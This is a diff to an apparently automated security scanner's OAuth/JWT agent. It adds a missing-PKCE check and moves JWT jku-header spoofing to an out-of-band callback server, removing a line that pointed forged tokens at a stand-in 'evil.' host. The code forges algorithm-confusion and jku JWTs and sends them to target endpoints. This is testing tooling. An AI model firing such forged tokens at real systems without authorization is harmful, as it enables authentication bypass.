@@ -276,6 +276,29 @@ class OAuthJWTCapabilityAgent(BaseCapabilityAgent):
                                 "_exchange_obj": exch1.to_dict()
                             })
 
+                    # Test 1.5: Missing PKCE challenge completely
+                    missing_pkce_url = f"{base_oauth}?response_type=code&client_id=test_client&redirect_uri=https://{context.asset}/callback"
+                    exch1_5 = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=missing_pkce_url)
+                    resp1_5 = exch1_5.response
+                    if resp1_5 and not self._is_spa_catchall_shell(resp1_5):
+                        body_lower1_5 = (resp1_5.body_text or "").lower()
+                        loc1_5 = resp1_5.headers.get("location", "") if resp1_5.headers else ""
+                        has_code1_5 = any(k in loc1_5.lower() for k in ["code=", "access_token="]) and "error=" not in loc1_5.lower()
+                        has_oauth_form1_5 = any(k in body_lower1_5 for k in ["authorization_code", "client_id", "grant_type", "consent", "authorize"])
+
+                        if (resp1_5.status_code in (301, 302, 303, 307, 308) and has_code1_5) or (resp1_5.status_code == 200 and has_oauth_form1_5 and "invalid_request" not in body_lower1_5 and "code_challenge" not in body_lower1_5):
+                            is_vuln = True
+                            best_confidence = max(best_confidence, 0.90)
+                            best_target = missing_pkce_url
+                            best_reasoning = f"HIGH OAuth PKCE Missing Challenge: Server accepted authorization request without any 'code_challenge' on '{base_oauth}'."
+                            findings.append({
+                                "vulnerability_type": "oauth_pkce_missing",
+                                "severity": "HIGH",
+                                "target_url": missing_pkce_url,
+                                "description": best_reasoning,
+                                "_exchange_obj": exch1_5.to_dict()
+                            })
+
                     # Test 2: Redirect URI path traversal
                     exch2 = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=traversal_url)
                     resp2 = exch2.response
@@ -315,9 +338,11 @@ class OAuthJWTCapabilityAgent(BaseCapabilityAgent):
             ).to_dict()
 
         elif capability_id == "jwt_alg_confusion_and_jwks":
+            from penflow.infrastructure.oob_server import OOBCallbackServer, InteractionProtocol
+            oob_server = OOBCallbackServer.get_instance()
+            
             fake_pub_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz\n-----END PUBLIC KEY-----"
             forged_hs256 = self._forge_hmac_confusion_jwt(token, fake_pub_key)
-            jku_token = self._forge_jku_jwt(token, f"https://evil.{context.asset}/jwks.json")
 
             findings = []
             is_vuln = False
@@ -326,6 +351,15 @@ class OAuthJWTCapabilityAgent(BaseCapabilityAgent):
             best_confidence = 0.0
 
             for url in target_urls[:4]:
+                oob_token = oob_server.generate_token(
+                    agent_name="oauth_jwt",
+                    scan_id=getattr(context, "session_id", "scan01") or "scan01",
+                    target_url=url,
+                    parameter_name="jku_header",
+                    protocol=InteractionProtocol.HTTP
+                )
+                oob_url = oob_server.get_callback_url(oob_token)
+                jku_token = self._forge_jku_jwt(token, oob_url)
                 try:
                     # Phase 0: Baseline unauthenticated check
                     exch_clean = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=url)
@@ -354,21 +388,37 @@ class OAuthJWTCapabilityAgent(BaseCapabilityAgent):
 
                     # Test JKU Spoofing
                     exch2 = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=url, headers={"Authorization": f"Bearer {jku_token}"})
-                    resp2 = exch2.response
-                    if resp2:
-                        body_lower2 = (resp2.body_text or "").lower()
-                        if resp2.status_code == 200 and not any(kw in body_lower2 for kw in auth_error_keywords) and clean_status in (401, 403, 302):
-                            is_vuln = True
-                            best_confidence = max(best_confidence, 0.92)
-                            best_target = url
-                            best_reasoning = f"HIGH JWT JWKS Header Injection: Server accepted external 'jku' header on protected endpoint '{url}' (HTTP 200)."
-                            findings.append({
-                                "vulnerability_type": "jwt_jwks_uri_spoofing",
-                                "severity": "HIGH",
-                                "target_url": url,
-                                "description": best_reasoning,
-                                "_exchange_obj": exch2.to_dict()
-                            })
+                    oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=0.5)
+                    
+                    if oob_hit:
+                        is_vuln = True
+                        best_confidence = max(best_confidence, 0.98)
+                        best_target = url
+                        best_reasoning = f"HIGH JWT JWKS Header Injection: Server performed OOB callback to '{oob_url}' verifying 'jku' header injection on '{url}'."
+                        findings.append({
+                            "vulnerability_type": "jwt_jwks_uri_spoofing",
+                            "severity": "HIGH",
+                            "target_url": url,
+                            "description": best_reasoning,
+                            "_exchange_obj": exch2.to_dict(),
+                            "oob_hit": True
+                        })
+                    else:
+                        resp2 = exch2.response
+                        if resp2:
+                            body_lower2 = (resp2.body_text or "").lower()
+                            if resp2.status_code == 200 and not any(kw in body_lower2 for kw in auth_error_keywords) and clean_status in (401, 403, 302):
+                                is_vuln = True
+                                best_confidence = max(best_confidence, 0.92)
+                                best_target = url
+                                best_reasoning = f"HIGH JWT JWKS Header Injection: Server accepted external 'jku' header on protected endpoint '{url}' (HTTP 200) without OOB."
+                                findings.append({
+                                    "vulnerability_type": "jwt_jwks_uri_spoofing",
+                                    "severity": "HIGH",
+                                    "target_url": url,
+                                    "description": best_reasoning,
+                                    "_exchange_obj": exch2.to_dict()
+                                })
                 except Exception as e:
                     logger.debug(f"[OAuthJWTAgent] jwt_alg_confusion_and_jwks failed on {url}: {e}")
 
